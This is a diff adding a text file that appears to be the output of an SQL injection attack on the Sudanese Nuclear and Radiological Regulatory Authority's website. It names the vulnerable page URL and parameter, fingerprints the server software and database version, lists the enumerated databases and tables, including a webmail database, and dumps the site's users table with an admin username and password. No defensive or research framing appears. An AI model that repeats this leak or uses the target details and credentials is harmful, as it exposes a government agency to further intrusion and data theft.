@@ -1,0 +1,123 @@
+.gov Government
+
+.sd	Sudan
+
+The Republic Of Sudan Sudanese Nuclear And Radiological Regulatory Authority
+
+The Control Apparatus For Radiological And Nuclear Activities | The Main One
+
+http://www.snrra.gov.sd/English/events%20details.php?id=1
+
+the back-end DBMS is MySQL
+web application technology: PHP 7.2.24, Apache
+the back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+banner: '5.5.68-MariaDB'
+
+available databases [3]:
+[+] information_schema
+[+] snrra
+[+] snrra_roundcube
+
+Database: snrra_roundcube
+[15 tables]
++---------------------+
+| session             |
+| system              |
+| cache               |
+| cache_index         |
+| cache_messages      |
+| cache_shared        |
+| cache_thread        |
+| contactgroupmembers |
+| contactgroups       |
+| contacts            |
+| dictionary          |
+| filestore           |
+| identities          |
+| searches            |
+| users               |
++---------------------+
+
+Database: snrra
+[70 tables]
++-------------------+
+| about_title       |
+| about_us          |
+| code              |
+| contact_us        |
+| dir1_intro        |
+| dir_title         |
+| directorates      |
+| e_about_title     |
+| e_about_us        |
+| e_contact_us      |
+| e_dir_title       |
+| e_directorates    |
+| e_emergancy_form  |
+| e_events          |
+| e_events_title    |
+| e_faq             |
+| e_important_links |
+| e_laws            |
+| e_link            |
+| e_link_title      |
+| e_medical_title   |
+| e_medical_titles  |
+| e_medical_uses    |
+| e_medical_uses2   |
+| e_medical_uses3   |
+| e_news            |
+| e_news_title      |
+| e_part            |
+| e_part_title      |
+| e_reg_medical     |
+| e_reg_un_medical  |
+| e_sections        |
+| e_speech          |
+| e_un_medical      |
+| e_un_medical2     |
+| e_un_medical3     |
+| e_word            |
+| em_form           |
+| emergancy_form    |
+| events            |
+| events_title      |
+| faq               |
+| gallary           |
+| important_links   |
+| l_link            |
+| laws              |
+| link              |
+| link_title        |
+| medical_titles    |
+| medical_uses      |
+| medical_uses2     |
+| medical_uses3     |
+| medicl_title1     |
+| news              |
+| news_title        |
+| part              |
+| part_title        |
+| reg_medical       |
+| reg_un_medical    |
+| sections          |
+| slider            |
+| social            |
+| speech            |
+| un_medical        |
+| un_medical_title  |
+| un_medical_title1 |
+| users             |
+| vedio_gal         |
+| vgallery          |
+| word              |
++-------------------+
+
+Database: snrra
+Table: users
+[2 entries]
++----------+----------+
+| username | password |
++----------+----------+
+| admin    | admin    |
++----------+----------+
